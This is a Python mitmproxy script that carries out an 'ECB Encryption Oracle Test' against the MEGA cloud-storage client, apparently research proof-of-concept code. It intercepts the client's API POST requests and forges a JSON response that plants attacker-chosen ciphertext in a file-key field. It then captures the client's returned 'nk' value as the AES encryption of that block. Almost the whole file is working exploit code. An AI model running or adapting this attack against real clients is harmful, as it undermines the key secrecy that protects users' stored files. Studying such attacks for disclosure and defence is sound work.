#!/usr/bin/env sage -python

import json
import time
import sys

c = b"CABrih03qailJ8clGF_773HBB9Ol2fj7saNjWMygLs01UC2NQGCi5hETIDFsR3t4CmEYmdTggyZ-pTXAh2K06Y7LRP5c9NSieu9Zf9D3H_3965R4_JhB68d_t0OChnvVU_IjuVC0bhcJDyjfnfkK172gXW74mzc_SYdbTAqLBXSd5k3HLhQuugV6heIyoOxRBgvWe6H9i8Ml8yReEerQ_Y-n3-oECwCWDExOsB3MhqcjV2wUB807FG4tBRtiW6biDYtKzeF7OxiydjH9sbGSw67O3MdwOdMMgeZWpwBpKymsbwMg2B7iMDKyYMhhGB_Or_39BV26xPRH6G5-666pLCPg"

MITMPROXY_LOG_FILE = "mitmproxy.log"

from mitmproxy import http
#from shared.constants.mega_crypto import *

def log_line(l):
    with open(MITMPROXY_LOG_FILE, "a") as log_fp:
        log_fp.write(f"{l}\n")


print(f"Writing to log file {MITMPROXY_LOG_FILE}")
with open(MITMPROXY_LOG_FILE, "a+") as log_fp:
    now = time.strftime("%Y-%m-%d %H:%M:%S")
    log_fp.write(f"Attack start")
    log_fp.write(f"\n-------- start ECB Encryption Oracle Test {now} ----------\n")

wait_for_dec = False
def request(flow: http.HTTPFlow) -> None:
    global wait_for_dec
    if not wait_for_dec:
        if flow.request.method == "POST" and "sid" in flow.request.query:
            log_line(f"Ask to encrypt {c}")
            wait_for_dec = True
            flow.response = http.Response.make(
                200,
                json.dumps({
                  "a": [
                    {
                      "a":"t",
                      "i":"NJLlagWuu8",
                      "t":{
                        "f": [
                          {
                            "t":0,
                            "h":"XXXXXXXX",
                            #"h":"HXhFkLjJ",
                            "a":"ruM-sL7xUri8I4x6NQ68ae0CPQXbS_u9MumEJNM9T9MstLALCZ967L4XrhEWBZahqIETRe6lAXeJ5YwWgr9InQ",
                            "k":f"3f9OhgHoO9Y:{c}",
                            "p":"rHwG2TYb",
                            "ts":1663284040,
                            "u":"3f9OhgHoO9Y",
                            "s":1000000
                          }
                        ]
                      },
                      "puf":"OLBl1QYS"
                    }
                  ],
                  "w":"https://g.api.mega.co.nz/wsc/GVhzS2Ahtysre-bVXxkl8A",
                  "sn":"70UnmYdybbk"
                }).encode(),
                {
                    "Content-Type": "application/json",
                    "Access-Control-Allow-Origin": "*",
                    "Access-Control-Allow-Headers": "Content-Type, MEGA-Chrome-Antileak",
                    "Access-Control-Expose-Headers": "Original-Content-Length",
                    "Access-Control-Max-Age": "86400",
                    "Connection": "keep-alive"
                }
            )
    else:
        if flow.request.text:
            t = json.loads(flow.request.text)

            if flow.request.method == "POST" \
                and type(t) == list \
                and hasattr(t[0], "__iter__") \
                and {"a", "nk"}.issubset(set(t[0].keys())) \
                and t[0]["a"] == "k":

                dec = t[0]["nk"][1]
                log_line(f"Got AES-encryption {dec}")
                wait_for_dec = False
